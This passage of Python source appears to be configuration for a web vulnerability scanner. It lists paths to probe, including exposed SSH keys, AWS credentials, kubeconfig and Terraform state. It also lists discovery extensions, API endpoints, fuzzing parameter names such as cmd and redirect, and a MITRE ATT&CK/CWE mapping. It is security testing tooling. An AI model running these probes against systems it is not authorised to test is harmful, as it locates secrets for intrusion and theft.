        "/application.wadl",
        "/api/application.wadl",
        "/rest/application.wadl",
        # SOAP endpoints
        "/soap",
        "/soap/",
        "/services/",
        "/axis2/services/",
        "/axis/services/",
        "/cxf/",
        "/ws/",
        # RSS / Atom feeds
        "/rss",
        "/rss.xml",
        "/atom.xml",
        "/feed",
        "/feed.xml",
        "/feed/atom",
        "/feed/rss",
        "/feeds",
        "/blog/feed",
        "/blog/rss",
        "/news/feed",
        "/index.rss",
        "/index.atom",
        # SVG files (potential XSS / XXE vector)
        "/images/logo.svg",
        "/assets/icon.svg",
        "/static/logo.svg",
        # OpenAPI / AsyncAPI / RAML / API Blueprint
        "/openapi.yaml",
        "/openapi.yml",
        "/openapi/v3/api-docs",
        "/openapi/v3/api-docs.yaml",
        "/asyncapi.json",
        "/asyncapi.yaml",
        "/api.raml",
        "/apiary.apib",
        "/api-blueprint.apib",
        # HAR / Postman / Insomnia collections
        "/collection.json",
        "/postman_collection.json",
        "/insomnia.json",
        "/api.har",
        # GraphQL schema
        "/graphql/schema",
        "/graphql?query={__schema{types{name}}}",
        "/api/graphql",
        # gRPC / Protobuf
        "/grpc",
        "/grpc/reflection",
        "/twirp/",
        # Health / metrics / tracing
        "/api/metrics",
        "/api/traces",
        "/api/spans",
        "/_cluster/health",
        "/_cat/indices",
        "/_nodes",
        # Kubernetes / Docker exposed endpoints
        "/api/v1/namespaces",
        "/api/v1/pods",
        "/api/v1/services",
        "/api/v1/nodes",
        "/apis",
        "/version",
        "/healthz",
        "/livez",
        "/readyz",
        # Terraform / Ansible / IaC
        "/terraform.tfstate",
        "/terraform.tfstate.backup",
        "/ansible.cfg",
        "/playbook.yml",
        "/inventory",
        "/group_vars/all.yml",
        "/host_vars/",
        # XML config leak paths
        "/crossdomain.xml",
        "/clientaccesspolicy.xml",
        "/browserconfig.xml",
        "/manifest.xml",
        "/pom.xml",
        "/ivy.xml",
        "/build.xml",
        "/struts.xml",
        "/tiles.xml",
        "/faces-config.xml",
        "/persistence.xml",
        "/ehcache.xml",
        "/log4j.xml",
        "/log4j2.xml",
        "/logback.xml",
        "/hibernate.cfg.xml",
        "/beans.xml",
        "/context.xml",
        "/server.xml",
        "/tomcat-users.xml",
        "/resin.xml",
        "/jboss-service.xml",
        # ── 16. Hidden / Developer Artifacts ──
        "/.DS_Store",
        "/Thumbs.db",
        "/.idea/",
        "/.vscode/",
        "/.project",
        "/.classpath",
        "/.settings/",
        "/.eclipse/",
        "/.editorconfig",
        "/.prettierrc",
        "/.eslintrc",
        "/.babelrc",
        "/tsconfig.json",
        "/webpack.config.js",
        "/.npmrc",
        "/.yarnrc",
        "/.nvmrc",
        # ── 17. Certificates & Secrets (if exposed) ──
        "/server.key",
        "/server.pem",
        "/server.crt",
        "/private.key",
        "/private.pem",
        "/id_rsa",
        "/id_dsa",
        "/id_ecdsa",
        "/id_ed25519",
        "/.ssh/id_rsa",
        "/.ssh/authorized_keys",
        "/.aws/credentials",
        "/.aws/config",
        "/credentials.json",
        "/service-account.json",
        "/terraform.tfstate",
        "/terraform.tfvars",
        "/.kube/config",
        "/vault.json",
        "/secrets.json",
        "/tokens.json",
        # ── 18. Source Map Files ──
        "/main.js.map",
        "/app.js.map",
        "/bundle.js.map",
        "/vendor.js.map",
        "/runtime.js.map",
        "/main.css.map",
        "/styles.css.map",
        # ── 19. Well-Known URIs ──
        "/.well-known/openid-configuration",
        "/.well-known/change-password",
        "/.well-known/apple-app-site-association",
        "/.well-known/assetlinks.json",
        "/.well-known/jwks.json",
        "/.well-known/oauth-authorization-server",
        "/.well-known/nodeinfo",
        "/.well-known/webfinger",
        # ── 20. Error Pages (info leakage) ──
        "/404",
        "/500",
        "/403",
        "/401",
        "/error",
        "/errors/",
        "/errors/500",
        "/cgi-bin/",
        "/cgi-bin/test-cgi",
        "/trace.axd",
    ]

    # --- Dangerous File Extensions to Probe (for backup/source discovery) ---
    DISCOVERY_EXTENSIONS = [
        # Active content
        ".html",
        ".htm",
        ".xhtml",
        ".shtml",
        ".php",
        ".php3",
        ".php4",
        ".php5",
        ".php7",
        ".phtml",
        ".phar",
        ".asp",
        ".aspx",
        ".ascx",
        ".ashx",
        ".asmx",
        ".axd",
        ".jsp",
        ".jspx",
        ".jhtml",
        ".jspf",
        ".do",
        ".action",
        ".jsf",
        ".cfm",
        ".cfml",
        ".cfc",
        ".pl",
        ".cgi",
        ".pm",
        ".py",
        ".rb",
        ".go",
        ".ts",
        # Source maps & client-side
        ".js",
        ".mjs",
        ".cjs",
        ".map",
        ".vue",
        ".jsx",
        ".tsx",
        ".css",
        ".scss",
        ".less",
        # Backup variants
        ".bak",
        ".backup",
        ".old",
        ".orig",
        ".copy",
        ".sav",
        ".swp",
        ".swo",
        # Archives
        ".zip",
        ".tar",
        ".tar.gz",
        ".tgz",
        ".7z",
        ".rar",
        ".gz",
        ".bz2",
        # Database
        ".sql",
        ".dump",
        ".psql",
        ".db",
        ".sqlite",
        ".sqlite3",
        ".rdb",
        # Config
        ".yml",
        ".yaml",
        ".toml",
        ".ini",
        ".cfg",
        ".conf",
        ".properties",
        ".env",
        ".json",
        ".xml",
        # Log
        ".log",
        # Keys & certs
        ".key",
        ".pem",
        ".crt",
        ".cer",
        ".pfx",
        ".p12",
        ".ppk",
        # Scripts
        ".sh",
        ".bash",
        ".ps1",
        ".bat",
        ".cmd",
    ]

    # --- API Endpoint Patterns (from SecLists API wordlists) ---
    API_ENDPOINT_PATTERNS = [
        "/api/v1/users",
        "/api/v1/admin",
        "/api/v1/auth",
        "/api/v1/login",
        "/api/v1/register",
        "/api/v1/token",
        "/api/v1/refresh",
        "/api/v1/config",
        "/api/v1/settings",
        "/api/v1/upload",
        "/api/v1/download",
        "/api/v1/export",
        "/api/v1/import",
        "/api/v1/search",
        "/api/v1/status",
        "/api/v2/users",
        "/api/v2/admin",
        "/api/v2/auth",
        "/api/users",
        "/api/admin",
        "/api/auth",
        "/api/health",
        "/api/token",
        "/api/config",
        "/api/settings",
        "/api/internal",
        "/api/private",
        "/api/debug",
        "/rest/v1/",
        "/rest/v2/",
        "/rest/api/",
        "/graphql",
        "/graphql/v1",
        "/rpc",
        "/jsonrpc",
        "/xmlrpc",
        # WSDL / SOAP / XML-RPC service endpoints
        "/ws/",
        "/services/",
        "/soap/",
        "/axis2/services/",
        "/?wsdl",
        "/Service?wsdl",
        "/service.asmx",
        "/service.svc",
        # gRPC / Protobuf
        "/grpc",
        "/twirp/",
        # OpenAPI / AsyncAPI spec endpoints
        "/openapi.yaml",
        "/asyncapi.json",
        "/asyncapi.yaml",
        "/api.raml",
        # Feed / syndication
        "/feed",
        "/rss",
        "/atom.xml",
    ]

    # --- Fuzzer Extra Parameters (from Arjun/ParamSpider) ---
    FUZZER_EXTRA_PARAMS = [
        # Auth & session
        "access_token",
        "refresh_token",
        "id_token",
        "oauth_token",
        "api_key",
        "apikey",
        "api_secret",
        "client_id",
        "client_secret",
        "session_id",
        "sessionid",
        "auth_token",
        "csrf_token",
        "xsrf_token",
        "nonce",
        "state",
        "code",
        "grant_type",
        "scope",
        # File / path operations
        "file",
        "filename",
        "filepath",
        "path",
        "dir",
        "directory",
        "folder",
        "root",
        "document",
        "template",
        "include",
        "require",
        "src",
        "source",
        "resource",
        "assets",
        # Network / URL
        "url",
        "uri",
        "href",
        "link",
        "next",
        "redirect",
        "redirect_uri",
        "return",
        "return_url",
        "returnTo",
        "callback",
        "continue",
        "destination",
        "forward",
        "goto",
        "target",
        "to",
        "out",
        "rurl",
        "reference",
        "site",
        # Injection points
        "cmd",
        "exec",
        "command",
        "execute",
        "ping",
        "query",
        "jump",
        "code",
        "reg",
        "do",
        "func",
        "arg",
        "option",
        "load",
        "process",
        "step",
        "read",
        "feature",
        "payload",
        # Display / debug
        "debug",
        "test",
        "verbose",
        "trace",
        "log_level",
        "env",
        "mode",
        "preview",
        "dev",
        "view_source",
        "internal",
        "hidden",
        "private",
        "show",
        "display",
        # Content
        "content",
        "body",
        "text",
        "html",
        "xml",
        "json",
        "data",
        "raw",
        "input",
        "output",
        "message",
        "comment",
        "title",
        "description",
        "subject",
        "bio",
        "name",
        # Sorting / filtering
        "sort",
        "order",
        "orderby",
        "sort_by",
        "direction",
        "filter",
        "where",
        "column",
        "field",
        "group_by",
        "having",
        "join",
        "table",
    ]


class Colors:
    """Terminal Colors"""

    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"
    BOLD = "\033[1m"
    UNDERLINE = "\033[4m"
    RESET = "\033[0m"

    @classmethod
    def success(cls, text):
        return f"{cls.GREEN}[✓]{cls.RESET} {text}"

    @classmethod
    def error(cls, text):
        return f"{cls.RED}[✗]{cls.RESET} {text}"

    @classmethod
    def warning(cls, text):
        return f"{cls.YELLOW}[!]{cls.RESET} {text}"

    @classmethod
    def info(cls, text):
        return f"{cls.CYAN}[*]{cls.RESET} {text}"

    @classmethod
    def critical(cls, text):
        return f"{cls.RED}{cls.BOLD}[CRITICAL]{cls.RESET} {text}"


# MITRE ATT&CK Mapping
MITRE_CWE_MAP = {
    "SQL Injection": ("T1190", "CWE-89"),
    "NoSQL Injection": ("T1190", "CWE-943"),
    "Command Injection": ("T1059", "CWE-78"),
    "SSTI": ("T1505", "CWE-1336"),
    "XXE": ("T1190", "CWE-611"),
    "XSS": ("T1189", "CWE-79"),
    "CSRF": ("T1659", "CWE-352"),
    "Open Redirect": ("T1566", "CWE-601"),
    "LFI": ("T1083", "CWE-22"),
    "RFI": ("T1505", "CWE-98"),
    "SSRF": ("T1505", "CWE-918"),
    "IDOR": ("T1083", "CWE-639"),
    "Race Condition": ("T1496", "CWE-362"),
    "Prototype Pollution": ("T1059", "CWE-915"),
    "HTTP Request Smuggling": ("T1505", "CWE-444"),
    "HTTP Smuggling": ("T1190", "CWE-444"),
    "GraphQL Injection": ("T1190", "CWE-89"),
    "JWT Weakness": ("T1550", "CWE-347"),
    "CORS Misconfiguration": ("T1550", "CWE-942"),
    "Cloud Metadata Exposure": ("T1552", "CWE-200"),
    "Cloud Config Exposure": ("T1552.001", "CWE-200"),
    "Cloud Credential Leak": ("T1552.001", "CWE-798"),
    "Public Cloud Storage": ("T1530", "CWE-284"),
    "Container Escape": ("T1611", "CWE-250"),
    "File Upload": ("T1505", "CWE-434"),
    "Path Traversal": ("T1083", "CWE-22"),
    "LDAP Injection": ("T1190", "CWE-90"),
    "XPath Injection": ("T1190", "CWE-643"),
    "XML Injection": ("T1190", "CWE-91"),
    "Log Injection": ("T1565", "CWE-117"),
    "Host Header Injection": ("T1550", "CWE-346"),
    "Cache Poisoning": ("T1565", "CWE-444"),
    "Information Disclosure": ("T1592", "CWE-200"),
    "CRLF Injection": ("T1190", "CWE-93"),
    "HTTP Parameter Pollution": ("T1190", "CWE-235"),
    "Network Exploit": ("T1190", "CWE-200"),
    "Tech Exploit": ("T1190", "CWE-1104"),
    "Service Exposure": ("T1190", "CWE-284"),
    "Missing Security Header": ("T1189", "CWE-693"),
    "Version Disclosure": ("T1592", "CWE-200"),
}
